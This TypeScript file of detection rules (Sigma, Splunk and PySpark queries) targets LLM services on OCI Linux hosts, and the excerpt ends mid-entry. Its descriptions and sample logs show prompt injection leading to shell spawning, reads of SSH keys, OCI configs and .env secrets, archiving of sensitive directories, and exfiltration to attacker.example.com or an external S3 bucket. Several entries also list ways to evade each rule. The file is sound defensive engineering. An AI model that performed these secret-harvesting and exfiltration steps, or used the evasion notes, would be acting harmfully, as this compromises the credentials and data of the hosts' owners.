import type { Detection } from "./types";

export const llmDetections: Detection[] = [
  // ── LLM01: Prompt Injection ───────────────────────────────────────────────
  {
    id: "llm01-001",
    title: "LLM Service Spawning Shell Interpreter",
    description:
      "Detects LLM service processes spawning shell interpreters (bash, sh, zsh). Under normal operation an LLM runtime should never directly fork an interactive shell. This pattern is a strong indicator of prompt injection achieving command execution.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1059.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "prompt-injection", "linux", "shell-execution", "owasp-llm01"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Spawning Shell Interpreter
owasp top 10: LLM01:2025 Prompt Injection
id: 47bcc2f2-6747-4641-becc-353c97cedd59
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /bash
      - /sh
      - /zsh
  condition: selection_parent and selection_child
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.execution
  - ai.llm
  - llm01.prompt-injection`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*", "*/var/lib/llm/*", "*/home/opc/llm/*")
  image IN ("*/bash", "*/sh", "*/zsh")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm01-001' AS detection_id,
           'LLM Service Spawning Shell Interpreter' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%'
        OR parent_image LIKE '%/srv/llm/%'
        OR parent_image LIKE '%/app/llm/%'
        OR parent_image LIKE '%/models/%'
        OR parent_image LIKE '%/var/lib/llm/%'
        OR parent_image LIKE '%/home/opc/llm/%')
      AND (image LIKE '%/bash'
        OR image LIKE '%/sh'
        OR image LIKE '%/zsh')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T09:14:22Z","computer_name":"llm-host-01","user":"llm_svc","image":"/bin/bash","command_line":"bash","parent_image":"/opt/llm/serve/model_server.py","parent_command_line":"python3 /opt/llm/serve/model_server.py --port 8080"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Legitimate health-check scripts invoked by the LLM service",
      "Setup or initialisation scripts run at startup under the LLM process tree",
    ],
    tuningGuidance:
      "Whitelist known startup wrapper scripts. Restrict the alert to non-startup time windows or use process ancestry depth to filter one-time init forks.",
    deploymentNotes:
      "Requires Linux process creation events with ParentImage populated. auditd with execve rules or an eBPF sensor (Falco, Tetragon) is recommended.",
    evasionConsiderations:
      "Attackers may use exec() syscalls within the Python process rather than forking, or may invoke less-monitored interpreters such as dash or busybox sh.",
    problemStatement:
      "LLM runtimes should never spawn interactive shells. A shell child process originating from an LLM service path is a reliable indicator of prompt injection achieving OS command execution.",
  },
  {
    id: "llm01-002",
    title: "LLM Service Calling OCI CLI After Prompt Handling",
    description:
      "Detects an LLM service process spawning the OCI CLI binary. This indicates that a prompt may have caused the model to issue cloud control-plane commands, enabling resource enumeration, data access, or privilege abuse via the OCI API.",
    platform: ["Linux", "AI/ML", "OCI"],
    mitre: ["T1059.004", "T1083"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "prompt-injection", "linux", "oci", "owasp-llm01"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Calling OCI CLI After Prompt Handling
owasp top 10: LLM01:2025 Prompt Injection
id: 9811f41e-54cd-444a-8353-81ca16e13036
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /oci
  condition: selection_parent and selection_child
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: high
tags:
  - attack.execution
  - attack.discovery
  - ai.llm
  - llm01.prompt-injection`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*", "*/var/lib/llm/*", "*/home/opc/llm/*")
  image="*/oci"
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm01-002' AS detection_id,
           'LLM Service Calling OCI CLI After Prompt Handling' AS detection_name,
           'high' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%'
        OR parent_image LIKE '%/srv/llm/%'
        OR parent_image LIKE '%/app/llm/%'
        OR parent_image LIKE '%/models/%')
      AND image LIKE '%/oci'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T11:02:45Z","computer_name":"llm-host-02","user":"llm_svc","image":"/usr/local/bin/oci","command_line":"oci compute instance list --compartment-id ocid1.compartment.oc1..xxx","parent_image":"/opt/llm/app/inference.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Legitimate LLM tools that intentionally wrap OCI CLI for infrastructure queries",
      "Approved agentic workflows with explicit OCI tool bindings",
    ],
    tuningGuidance:
      "Baseline expected OCI CLI sub-commands for the service. Alert on destructive or IAM sub-commands (iam, policy, instance terminate) with higher priority.",
    deploymentNotes:
      "Requires process lineage telemetry. The OCI CLI binary path may vary; ensure the filter covers /usr/local/bin/oci and any custom install paths.",
    evasionConsiderations:
      "Attackers may use the OCI Python SDK directly within the LLM process rather than spawning the CLI, bypassing process-based detections.",
    problemStatement:
      "An LLM service invoking the OCI CLI suggests the model output or an injected prompt triggered cloud API calls, potentially enabling reconnaissance or resource abuse.",
  },
  {
    id: "llm01-003",
    title: "LLM Service Reading User-Supplied Files From Temp Or Upload Paths",
    description:
      "Detects LLM service processes accessing files under temporary or upload directories. Attackers can plant malicious content in these paths to deliver indirect prompt injections via document ingestion.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1005"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "prompt-injection", "linux", "file-access", "owasp-llm01"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Reading User Supplied Files From Temp Or Upload Paths
owasp top 10: LLM01:2025 Prompt Injection
id: 41fe1ca6-526d-4846-b10c-bfd16eaf9eb8
status: experimental
logsource:
  category: file_access
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|contains:
      - /tmp/
      - /var/tmp/
      - /uploads/
      - /tmp/gradio/
      - /tmp/streamlit/
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm01.prompt-injection`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/tmp/*" OR target_filename="*/uploads/*" OR target_filename="*/var/tmp/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm01-003' AS detection_id,
           'LLM Service Reading User Supplied Files From Temp Or Upload Paths' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/tmp/%'
        OR target_filename LIKE '%/var/tmp/%'
        OR target_filename LIKE '%/uploads/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T14:33:11Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/rag_ingest.py","target_filename":"/tmp/gradio/upload_abc123/document.pdf","access_type":"read"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "Legitimate document ingestion pipelines that stage files in /tmp before processing",
      "Gradio or Streamlit demo apps with intentional upload directories",
    ],
    tuningGuidance:
      "Scope to file extensions associated with document ingestion (.pdf, .txt, .docx, .md). Exclude known automated pipeline service accounts.",
    deploymentNotes:
      "Requires file access auditing via auditd -w rules on /tmp, /var/tmp, and /uploads paths with -p r (read) permission.",
    evasionConsiderations:
      "Attacker may name malicious files with benign extensions or place them in application-specific subdirectories not covered by the filter.",
    problemStatement:
      "LLM services that read user-supplied documents from staging paths are vulnerable to indirect prompt injection. Malicious content embedded in uploaded files can hijack model behaviour.",
  },
  {
    id: "llm01-004",
    title: "LLM Service Connecting To Unexpected External Destination",
    description:
      "Detects LLM service processes making outbound network connections to external destinations outside the OCI and private network baseline. A prompt injection may instruct the model to exfiltrate data or beacon to an attacker-controlled server.",
    platform: ["Linux", "AI/ML", "Network"],
    mitre: ["T1071.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "prompt-injection", "linux", "network", "owasp-llm01"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Connecting To New External Destination After Request Processing
owasp top 10: LLM01:2025 Prompt Injection
id: 4cdfa1e0-b924-427c-addc-22b623c70527
status: experimental
logsource:
  category: network_connection
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  filter_oci:
    DestinationHostname|endswith:
      - .oraclecloud.com
      - .oci.oraclecloud.com
      - .oracle.com
  filter_private:
    DestinationIp|cidr:
      - 10.0.0.0/8
      - 172.16.0.0/12
      - 192.168.0.0/16
  condition: selection_proc and not 1 of filter_*
fields:
  - Image
  - DestinationHostname
  - DestinationIp
  - DestinationPort
  - User
  - ComputerName
level: medium
tags:
  - attack.command-and-control
  - ai.llm
  - llm01.prompt-injection`,
    splunk: `index=linux_network sourcetype=network_connection
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  NOT (dest_hostname="*.oraclecloud.com" OR dest_hostname="*.oracle.com")
  NOT (dest_ip="10.*" OR dest_ip="172.16.*" OR dest_ip="192.168.*")
| table _time, computer_name, user, image, dest_hostname, dest_ip, dest_port
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, destination_hostname, destination_ip, destination_port,
           'llm01-004' AS detection_id,
           'LLM Service Connecting To Unexpected External Destination' AS detection_name,
           'medium' AS severity
    FROM linux_network_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND destination_hostname NOT LIKE '%.oraclecloud.com'
      AND destination_hostname NOT LIKE '%.oracle.com'
      AND destination_ip NOT LIKE '10.%'
      AND destination_ip NOT LIKE '172.16.%'
      AND destination_ip NOT LIKE '192.168.%'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T16:55:03Z","computer_name":"llm-host-03","user":"llm_svc","image":"/srv/llm/app/server.py","destination_hostname":"attacker.example.com","destination_ip":"198.51.100.42","destination_port":443}`,
    ],
    requiredFields: ["image", "destination_hostname", "destination_ip", "destination_port", "user", "computer_name"],
    falsePositives: [
      "LLM services with legitimate integrations to external APIs (HuggingFace, OpenAI)",
      "Telemetry or licensing beacons to approved vendor endpoints",
    ],
    tuningGuidance:
      "Maintain an allowlist of approved external destinations for each LLM service. Alert on first-seen destinations using a lookup table approach.",
    deploymentNotes:
      "Requires network connection telemetry with process context (eBPF, auditd SOCK_CONNECT, or EDR network events).",
    evasionConsiderations:
      "Attackers may use DNS-over-HTTPS or tunnel traffic through an approved destination to bypass hostname-based filtering.",
    problemStatement:
      "Prompt injection can cause an LLM to initiate outbound connections for data exfiltration or C2 callback. Unexpected external network connections from LLM service processes are a reliable post-injection signal.",
  },
  {
    id: "llm01-005",
    title: "LLM Service Writing Script To Temp Path",
    description:
      "Detects LLM service processes writing script files (.sh, .py, .pl) to temporary directories. This pattern suggests the model output or an injected prompt caused the service to stage executable code for later execution.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1059.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "prompt-injection", "linux", "file-write", "owasp-llm01"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Writing Script To Temp Path
owasp top 10: LLM01:2025 Prompt Injection
id: 23509473-62ad-4d3c-b267-8ef4baa63c15
status: experimental
logsource:
  category: file_event
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_path:
    TargetFilename|contains:
      - /tmp/
      - /var/tmp/
  selection_ext:
    TargetFilename|endswith:
      - .sh
      - .py
      - .pl
  condition: selection_proc and selection_path and selection_ext
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: medium
tags:
  - attack.defense-evasion
  - ai.llm
  - llm01.prompt-injection`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/tmp/*" OR target_filename="*/var/tmp/*")
  (target_filename="*.sh" OR target_filename="*.py" OR target_filename="*.pl")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm01-005' AS detection_id,
           'LLM Service Writing Script To Temp Path' AS detection_name,
           'medium' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/tmp/%' OR target_filename LIKE '%/var/tmp/%')
      AND (target_filename LIKE '%.sh' OR target_filename LIKE '%.py' OR target_filename LIKE '%.pl')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T17:21:09Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/chat_handler.py","target_filename":"/tmp/run_task.sh","event_type":"file_create"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "LLM code generation tools that intentionally write scripts to temp for sandboxed execution",
    ],
    tuningGuidance:
      "Correlate with subsequent execution events on the same file. A write followed by exec of the same filename is high confidence.",
    deploymentNotes:
      "Requires file write auditing on /tmp and /var/tmp via auditd -w rules with -p w (write) permission.",
    evasionConsiderations:
      "Attacker may write scripts without a recognisable extension, or write to application-specific temp paths not covered by the filter.",
    problemStatement:
      "Prompt injection may cause an LLM service to generate and stage malicious scripts in temporary directories as a precursor to code execution.",
  },

  // ── LLM02: Sensitive Information Disclosure ───────────────────────────────
  {
    id: "llm02-001",
    title: "LLM Service Accessing OCI Config Or API Key Material",
    description:
      "Detects LLM service processes reading OCI configuration files or API key material. Access to these files from an LLM runtime may indicate credential harvesting triggered by a prompt injection or misconfigured model tool access.",
    platform: ["Linux", "AI/ML", "OCI"],
    mitre: ["T1552.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "credential-access", "linux", "oci", "owasp-llm02"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Accessing OCI Config Or API Key Material
owasp top 10: LLM02:2025 Sensitive Information Disclosure
id: 1827b363-27b1-426f-9b36-afca943d3fd8
status: experimental
logsource:
  category: file_access
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|contains:
      - /.oci/config
      - /.oci/oci_api_key
      - /etc/oci/
      - /home/opc/.oci/
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.credential-access
  - ai.llm
  - llm02.sensitive-information-disclosure`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*/.oci/config" OR target_filename="*/.oci/oci_api_key*" OR target_filename="*/etc/oci/*")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm02-001' AS detection_id,
           'LLM Service Accessing OCI Config Or API Key Material' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%/.oci/config'
        OR target_filename LIKE '%/.oci/oci_api_key%'
        OR target_filename LIKE '%/etc/oci/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T10:07:44Z","computer_name":"llm-host-02","user":"llm_svc","image":"/opt/llm/app/tool_executor.py","target_filename":"/home/opc/.oci/config","access_type":"read"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "LLM tools that legitimately require OCI SDK authentication configured via the standard config file",
    ],
    tuningGuidance:
      "If the LLM service requires OCI access, use instance principal or resource principal authentication instead of file-based credentials to eliminate this signal.",
    deploymentNotes:
      "Requires file access auditing on ~/.oci/ paths. Ensure auditd watches are applied to the opc home directory.",
    evasionConsiderations:
      "Credentials may be passed via environment variables or instance metadata service, which would not trigger this file-based detection.",
    problemStatement:
      "OCI config files contain API keys and private keys granting cloud control-plane access. An LLM service reading these files may be harvesting credentials for use by an attacker.",
  },
  {
    id: "llm02-002",
    title: "LLM Service Reading SSH Private Keys",
    description:
      "Detects LLM service processes accessing SSH private key files. Reading private key material from an LLM runtime indicates potential credential theft that could enable lateral movement across infrastructure.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1552.004"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "credential-access", "linux", "ssh", "owasp-llm02"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Reading SSH Private Keys
owasp top 10: LLM02:2025 Sensitive Information Disclosure
id: 6b2076e6-9ec9-4ffb-a750-d270826245ed
status: experimental
logsource:
  category: file_access
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|endswith:
      - id_rsa
      - id_ed25519
      - .pem
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.credential-access
  - ai.llm
  - llm02.sensitive-information-disclosure`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*id_rsa" OR target_filename="*id_ed25519" OR target_filename="*.pem")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm02-002' AS detection_id,
           'LLM Service Reading SSH Private Keys' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%id_rsa'
        OR target_filename LIKE '%id_ed25519'
        OR target_filename LIKE '%.pem')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T13:18:57Z","computer_name":"llm-host-01","user":"llm_svc","image":"/srv/llm/tools/file_reader.py","target_filename":"/home/opc/.ssh/id_rsa","access_type":"read"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "LLM tools with legitimate SSH tool-use capabilities accessing known deployment keys",
    ],
    tuningGuidance:
      "Alert should be treated as high priority with minimal tuning. Scope to .pem files if certificate-based TLS reads generate noise.",
    deploymentNotes:
      "Requires auditd file access watches on ~/.ssh/ directories across all user home paths on the LLM host.",
    evasionConsiderations:
      "Attacker may read key material via a spawned process (cat, base64) rather than direct file access from the LLM process.",
    problemStatement:
      "SSH private keys on the LLM host can enable lateral movement across the entire infrastructure. An LLM process accessing these files indicates credential theft, whether via prompt injection or misconfigured tool access.",
  },
  {
    id: "llm02-003",
    title: "LLM Service Accessing Environment Secrets Files",
    description:
      "Detects LLM service processes reading .env or .netrc files that commonly contain application secrets, API keys, and passwords. This access pattern suggests the model or an injected prompt is attempting to harvest secrets.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1552.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "high",
    tags: ["llm", "credential-access", "linux", "secrets", "owasp-llm02"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Accessing Environment Secrets Files
owasp top 10: LLM02:2025 Sensitive Information Disclosure
id: 8e71b4df-90e8-452d-8993-00f1f484b952
status: experimental
logsource:
  category: file_access
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_file:
    TargetFilename|endswith:
      - .env
      - .env.prod
      - .env.production
      - .netrc
  condition: selection_proc and selection_file
fields:
  - Image
  - TargetFilename
  - User
  - ComputerName
level: high
tags:
  - attack.credential-access
  - ai.llm
  - llm02.sensitive-information-disclosure`,
    splunk: `index=linux_audit sourcetype=auditd_file
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (target_filename="*.env" OR target_filename="*.env.prod" OR target_filename="*.netrc")
| table _time, computer_name, user, image, target_filename
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, target_filename,
           'llm02-003' AS detection_id,
           'LLM Service Accessing Environment Secrets Files' AS detection_name,
           'high' AS severity
    FROM linux_file_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (target_filename LIKE '%.env'
        OR target_filename LIKE '%.env.prod'
        OR target_filename LIKE '%.env.production'
        OR target_filename LIKE '%.netrc')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T15:44:31Z","computer_name":"llm-host-03","user":"llm_svc","image":"/opt/llm/app/inference.py","target_filename":"/opt/llm/app/.env.prod","access_type":"read"}`,
    ],
    requiredFields: ["image", "target_filename", "user", "computer_name"],
    falsePositives: [
      "LLM service reading its own .env file during initialisation — expected on first start",
    ],
    tuningGuidance:
      "Exclude reads at process startup time (within 30s of service start). Alert on reads that occur during active request processing.",
    deploymentNotes:
      "Requires auditd file access watches. Consider using Vault or OCI Vault for secrets rather than .env files to eliminate this attack surface.",
    evasionConsiderations:
      "Secrets passed via environment variables at process start will not appear as file reads and require env inspection tooling to detect.",
    problemStatement:
      ".env files often contain database credentials, API keys, and service tokens. An LLM process accessing these files outside of initialisation is a strong indicator of secrets harvesting.",
  },
  {
    id: "llm02-004",
    title: "LLM Service Compressing Potentially Sensitive Data",
    description:
      "Detects LLM service processes spawning archive utilities (tar, zip, gzip) targeting application or home directories. This behaviour suggests data staging prior to exfiltration of sensitive model data or credentials.",
    platform: ["Linux", "AI/ML"],
    mitre: ["T1005", "T1560.001"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "collection", "linux", "archive", "owasp-llm02"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Compressing Potentially Sensitive Data
owasp top 10: LLM02:2025 Sensitive Information Disclosure
id: aaedf293-33c9-48f4-8c9b-9734f5042258
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_child:
    Image|endswith:
      - /tar
      - /zip
      - /gzip
  selection_args:
    CommandLine|contains:
      - /home/
      - /srv/
      - /app/
      - /models/
  condition: selection_parent and selection_child and selection_args
fields:
  - ParentImage
  - Image
  - CommandLine
  - User
  - ComputerName
level: medium
tags:
  - attack.collection
  - ai.llm
  - llm02.sensitive-information-disclosure`,
    splunk: `index=linux_audit sourcetype=auditd_process
  parent_image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  image IN ("*/tar", "*/zip", "*/gzip")
  (command_line="*/home/*" OR command_line="*/srv/*" OR command_line="*/models/*")
| table _time, computer_name, user, image, command_line, parent_image
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, command_line, parent_image,
           'llm02-004' AS detection_id,
           'LLM Service Compressing Potentially Sensitive Data' AS detection_name,
           'medium' AS severity
    FROM linux_audit_events
    WHERE (parent_image LIKE '%/opt/llm/%' OR parent_image LIKE '%/srv/llm/%')
      AND (image LIKE '%/tar' OR image LIKE '%/zip' OR image LIKE '%/gzip')
      AND (command_line LIKE '%/home/%' OR command_line LIKE '%/models/%' OR command_line LIKE '%/srv/%')
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T18:02:15Z","computer_name":"llm-host-02","user":"llm_svc","image":"/bin/tar","command_line":"tar czf /tmp/out.tgz /home/opc/.oci /models/","parent_image":"/opt/llm/app/tool_runner.py"}`,
    ],
    requiredFields: ["image", "command_line", "parent_image", "user", "computer_name"],
    falsePositives: [
      "Scheduled backup jobs running under the LLM service account",
      "Model snapshot utilities that compress model weights for storage",
    ],
    tuningGuidance:
      "Correlate with subsequent outbound network connections from the same host to identify staged exfiltration. Exclude known backup service accounts.",
    deploymentNotes:
      "Requires process creation events with parent process tracking. Ensure the LLM service account is uniquely identifiable.",
    evasionConsiderations:
      "Attackers may use Python's zipfile or tarfile modules directly within the LLM process, avoiding child process spawning.",
    problemStatement:
      "Compressing directories containing credentials, model weights, or application data is a classic pre-exfiltration staging step. When this occurs from an LLM service process it indicates the model has been directed to collect and stage sensitive data.",
  },
  {
    id: "llm02-005",
    title: "LLM Service Outbound Connection To Non-OCI Object Storage",
    description:
      "Detects LLM service processes connecting to object storage endpoints (S3, Azure Blob, GCS) outside the OCI baseline. This pattern indicates potential exfiltration of sensitive model outputs, training data, or credentials to external cloud storage.",
    platform: ["Linux", "AI/ML", "Network"],
    mitre: ["T1048.002"],
    category: "AI Security",
    maturity: "experimental",
    severity: "medium",
    tags: ["llm", "exfiltration", "linux", "network", "owasp-llm02"],
    author: "Detection Engineering Team",
    updated: "2025-01-15",
    sigma: `title: LLM Service Outbound Connection To Object Storage Outside OCI Baseline
owasp top 10: LLM02:2025 Sensitive Information Disclosure
id: 8870d11f-8066-4350-b1a2-0ebcf97ebf9c
status: experimental
logsource:
  category: network_connection
  product: linux
detection:
  selection_proc:
    Image|contains:
      - /opt/llm/
      - /srv/llm/
      - /app/llm/
      - /models/
      - /var/lib/llm/
      - /home/opc/llm/
  selection_host:
    DestinationHostname|contains:
      - objectstorage
      - s3
      - blob.core
      - storage.googleapis
  filter_oci:
    DestinationHostname|contains:
      - objectstorage.
      - oraclecloud.com
  condition: selection_proc and selection_host and not filter_oci
fields:
  - Image
  - DestinationHostname
  - DestinationIp
  - DestinationPort
  - User
  - ComputerName
level: medium
tags:
  - attack.exfiltration
  - ai.llm
  - llm02.sensitive-information-disclosure`,
    splunk: `index=linux_network sourcetype=network_connection
  image IN ("*/opt/llm/*", "*/srv/llm/*", "*/app/llm/*", "*/models/*")
  (dest_hostname="*s3*" OR dest_hostname="*blob.core*" OR dest_hostname="*storage.googleapis*")
  NOT (dest_hostname="*.oraclecloud.com")
| table _time, computer_name, user, image, dest_hostname, dest_ip, dest_port
| sort -_time`,
    pyspark: `result = spark.sql("""
    SELECT timestamp, computer_name AS host, user,
           image, destination_hostname, destination_ip,
           'llm02-005' AS detection_id,
           'LLM Service Outbound Connection To Non-OCI Object Storage' AS detection_name,
           'medium' AS severity
    FROM linux_network_events
    WHERE (image LIKE '%/opt/llm/%' OR image LIKE '%/srv/llm/%' OR image LIKE '%/app/llm/%')
      AND (destination_hostname LIKE '%s3%'
        OR destination_hostname LIKE '%blob.core%'
        OR destination_hostname LIKE '%storage.googleapis%')
      AND destination_hostname NOT LIKE '%.oraclecloud.com'
""")`,
    sampleLogs: [
      `{"timestamp":"2025-01-15T19:30:44Z","computer_name":"llm-host-01","user":"llm_svc","image":"/opt/llm/app/output_handler.py","destination_hostname":"exfil-bucket.s3.amazonaws.com","destination_ip":"52.216.8.11","destination_port":443}`,
    ],
    requiredFields: ["image", "destination_hostname", "destination_ip", "user", "computer_name"],
    falsePositives: [
      "LLM services with approved multi-cloud data pipelines writing outputs to AWS S3 or Azure Blob",
    ],
    tuningGuidance:
      "Maintain an explicit allowlist of approved external object storage endpoints. Any destination outside this list should alert.",
    deploymentNotes:
      "Requires network telemetry with process attribution. DNS logging can supplement hostname resolution for this detection.",
    evasionConsiderations:
      "Attacker may exfiltrate to a custom domain that proxies to object storage, bypassing keyword-based hostname matching.",
    problemStatement:
      "Connections from LLM processes to non-OCI object storage endpoints suggest data is being exfiltrated to attacker-controlled or unintended cloud storage, potentially including model weights, training data, or harvested credentials.",
  },

  // ── LLM03: Supply Chain ───────────────────────────────────────────────────
  {
    id: "llm03-001",
    title: "LLM Host Installing Python Packages From Unapproved Repository",
    description:
      "Detects pip or Python processes on an LLM host connecting to package repositories other than the approved PyPI or OCI mirrors. Installing packages from unapproved sources can introduce malicious dependencies into the LLM runtime.",
    platform: ["Linux", "AI/ML"],
